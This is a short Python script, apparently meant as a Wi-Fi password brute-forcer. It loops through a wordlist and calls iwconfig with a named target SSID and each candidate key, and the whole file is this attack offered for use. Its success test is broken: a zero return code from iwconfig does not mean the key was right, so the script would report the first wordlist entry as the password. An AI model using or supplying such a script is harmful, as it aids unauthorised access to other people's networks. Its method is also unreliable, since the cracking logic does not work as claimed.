import subprocess

# Define the path to your wordlist file
wordlist_path = "wordlist.txt"

# Define the SSID of the Wi-Fi network you want to attack
target_ssid = "DS124WS"

# Execute the brute force attack using the provided wordlist
try:
    with open(wordlist_path, 'r') as file:
        for line in file:
            password = line.strip()
            result = subprocess.run(["iwconfig", "wlan0", "essid", target_ssid, "key", password], capture_output=True)
            print(result.returncode)
            if result.returncode ==0:
                print(f"Password found: {password}")
                break
            else:
                print(f"Trying password: {password}")
except FileNotFoundError:
    print("Wordlist file not found. Please provide the correct path.")
